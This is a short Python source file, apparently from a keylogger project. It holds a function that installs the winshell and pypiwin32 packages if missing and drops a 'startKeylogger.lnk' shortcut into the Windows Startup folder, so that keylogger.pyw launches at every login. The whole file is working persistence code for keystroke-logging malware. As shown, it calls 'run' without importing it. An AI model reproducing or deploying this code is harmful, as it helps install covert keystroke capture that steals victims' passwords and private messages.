import os, sys

# print("Enabling to run at StartUp")
def createBat():
    user = (
        os.environ["USERPROFILE"]
        + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    )
    if not os.path.isfile("{0}\\startKeylogger.lnk".format(user)):
        check_elevate = run(
            ["pip", "show", "winshell"], shell=True, capture_output=True
        ).returncode
        if check_elevate == 1:
            print("INSTALLING WINSHELL...")
            run(["pip", "install", "winshell"], shell=True)
        check_elevate = run(
            ["pip", "show", "pypiwin32"], shell=True, capture_output=True
        ).returncode
        if check_elevate == 1:
            print("INSTALLING PYPIWIN32...")
            run(["pip", "install", "pypiwin32"], shell=True)
        import winshell

        path = os.getcwd()
        link_filepath = os.path.join(user, "startKeylogger.lnk")
        with winshell.shortcut(link_filepath) as link:
            link.working_directory = path
            link.path = f"{path}\\keylogger.pyw"
            link.description = "Shortcut to keylogger"
